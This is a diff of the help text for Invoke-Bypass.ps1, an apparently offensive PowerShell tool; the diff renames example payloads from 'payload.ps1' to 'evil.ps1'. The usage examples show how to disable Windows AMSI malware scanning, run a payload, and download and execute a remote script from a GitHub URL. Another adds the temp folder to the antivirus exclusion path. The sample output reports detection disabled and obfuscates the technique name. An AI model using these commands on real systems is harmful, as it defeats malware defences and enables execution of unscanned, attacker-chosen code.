@@ -45,20 +45,20 @@
    Bypass ams1 detection on current proccess
 
 .EXAMPLE
-   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -filepath "payload.ps1"
-   Bypass ams1 detection on current proccess and execute payload.ps1
+   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -filepath "evil.ps1"
+   Bypass ams1 detection on current proccess and execute evil.ps1
 
 .EXAMPLE
-   PS C:\> .\Invoke-Bypass.ps1 -technic "3" -filepath "payload.ps1" -fileargs "-action 'true'"
-   Bypass ams1 detection on current proccess and execute payload.ps1 with arguments (parameters)
+   PS C:\> .\Invoke-Bypass.ps1 -technic "3" -filepath "evil.ps1" -fileargs "-action 'true'"
+   Bypass ams1 detection on current proccess and execute evil.ps1 with arguments (parameters)
 
 .EXAMPLE
    PS C:\> .\Invoke-Bypass.ps1 -technic "4" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
    Bypass ams1 detection on current proccess and download\execute sysinfo.ps1 with arguments ( -sysinfo enum )
 
 .EXAMPLE
-   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -filepath "$Env:TMP\payload.ps1" -ExcludeLocation "$Env:TMP"
-   Bypass ams1 detection on current proccess, execute payload.ps1 and add 'TMP' dir to AV exclusion path.
+   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -filepath "$Env:TMP\evil.ps1" -ExcludeLocation "$Env:TMP"
+   Bypass ams1 detection on current proccess, execute evil.ps1 and add 'TMP' dir to AV exclusion path.
 
 .INPUTS
    None. You cannot pipe objects into Invoke-Bypass.ps1
@@ -71,9 +71,9 @@
    Bypass      : success
    Disclosure  : @mattifestation
    Description : FORCE_AM`SI_ERROR
-   POC         : Auto-Execute: payload.ps1
-   Report      : string detection disabled on console!
-   Executing   : payload.ps1
+   POC         : Auto-Execute: evil.ps1
+   Report      : string detection DISABLED on console!
+   Executing   : evil.ps1
    
 .LINK
    https://github.com/r00t-3xp10it/redpill/tree/main/bypass/Invoke-Bypass.ps1
